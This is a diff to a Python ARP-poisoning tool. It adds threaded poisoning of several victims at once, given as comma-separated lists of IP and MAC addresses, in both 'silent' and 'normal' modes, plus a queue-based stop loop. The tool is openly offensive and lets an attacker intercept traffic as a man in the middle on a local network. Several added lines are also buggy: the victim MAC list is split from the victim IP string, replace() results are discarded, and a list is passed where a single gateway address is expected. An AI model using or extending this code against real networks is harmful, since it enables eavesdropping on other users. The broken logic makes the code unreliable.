@@ -2,7 +2,10 @@ import argparse
 import logging
 import re
 import sys
-import gui
+import threading
+import Queue
+import time
+
 import scan
 
 
@@ -40,7 +43,8 @@ parser.add_argument('-p',
 
 parser.add_argument('-vi',
                     '--victim',
-                    help="Use this flag to specify the IP address of the victim"
+                    help="Use this flag to specify the IP address of the victim, for multiple addresses "
+                         "seperate them by comma"
                     )
 
 parser.add_argument('-gt',
@@ -50,7 +54,8 @@ parser.add_argument('-gt',
 
 parser.add_argument('-vm',
                     '--victimmac',
-                    help="Use this flag to specify the MAC address of the victim"
+                    help="Use this flag to specify the MAC address of the victim, for multiple separate"
+                         "them by comma in order of victims"
                     )
 
 parser.add_argument('-gm',
@@ -104,6 +109,23 @@ logger.addHandler(file_handler)
 logger.addHandler(handler)
 
 
+# For interrupting the started threads
+def threads_started(victims):
+    try:
+        while 1:
+            try:
+                msg = scan.get_queue()
+                if msg == 'Done':
+                    sys.exit(1)
+                else:
+                    scan.set_queue(msg)
+            except Queue.Empty:
+                time.sleep(.1)
+    except KeyboardInterrupt:
+        for i in range(victims):
+            scan.set_queue('stop')
+
+
 def main():
     args = parser.parse_args()
     logger.setLevel(args.loglevel)
@@ -113,6 +135,7 @@ def main():
 
     # If gui was specified we will launch te GUI otherwise the program will run from the command line
     if args.gui:
+        import gui
         gui.run()
     else:
         # A scan of the network has been requested
@@ -125,13 +148,25 @@ def main():
         elif args.arp == 'silent' or args.arp == 's':
             args = check_arp(args)
             logging.info("Starting silent ARP Poison")
-            scan.arp_poison_stealthy(router_ip=args.gateway, victim_ip=args.victim, victim_mac=args.victimmac,
-                                     attacker_mac=args.attackermac)
+            for i in range(len(args.victim)):
+                poison_thread = threading.Thread(target=scan.arp_poison_stealthy, args=(args.victim[i],
+                                                                                        args.victimmac[i], args.gateway,
+                                                                                        args.attackermac))
+                poison_thread.start()
+
+            threads_started(len(args.victim))
+            sys.exit(1)
         elif args.arp == 'normal' or args.arp == 'n':
             args = check_arp(args)
             logging.info("Starting ARP Poison")
-            scan.arp_poison(router_ip=args.gateway, router_mac=args.gatewaymac, victim_ip=args.victim,
-                            victim_mac=args.victimmac, attacker_mac=args.attackermac, iterations=args.packets)
+            for i in range(len(args.victim)):
+                poison_thread = threading.Thread(target=scan.arp_poison, args=(args.victim[i], args.victimmac[i],
+                                                                               args.gateway, args.gatewaymac,
+                                                                               args.attackermac, args.packets))
+                poison_thread.start()
+
+            threads_started(len(args.victim))
+            sys.exit(1)
         elif args.scaniface:
             # Grab the IP's and MAC addresses
             logger.info("Matching the interface")
@@ -154,6 +189,12 @@ def check_arp(args):
                     "The mac flags are optional.")
         sys.exit(1)
 
+    if "," in args.victim:
+        args.victim.replace(" ", "")
+        args.victim = args.victim.split(",")
+    else:
+        args.victim = [args.victim]
+
     if args.attackermac is not None and not re.match("[0-9a-f]{2}([-:]?)[0-9a-f]{2}(\\1[0-9a-f]{2}){4}$",
                                                      args.attackermac):
         logger.warn("Attacker MAC address is not a proper MAC address")
@@ -165,12 +206,21 @@ def check_arp(args):
         args.packets = 100
 
     if args.victimmac is None:
-        logging.info("Grabbing the victims MAC address since nothing was specified")
-        args.victimmac = scan.get_mac(args.gateway, args.victim)
+        logging.info("Grabbing the victims MAC address(es) since nothing was specified")
+        args.victimmac = []
+        for v in args.victim:
+            args.victimmac.append(scan.get_mac(args.gateway, v))
+    elif "," in args.victimmac:
+        args.victimmac.replace(" ", "")
+        args.victimmac = args.victim.split(",")
+    else:
+        args.victimmac = [args.victimmac]
 
     if args.gatewaymac is None:
         logging.info("Grabbing the gateways MAC address since nothing was specified")
         args.gatewaymac = scan.get_mac(args.victim, args.gateway)
+
+    victims = len(args.victim)
 
     return args
 
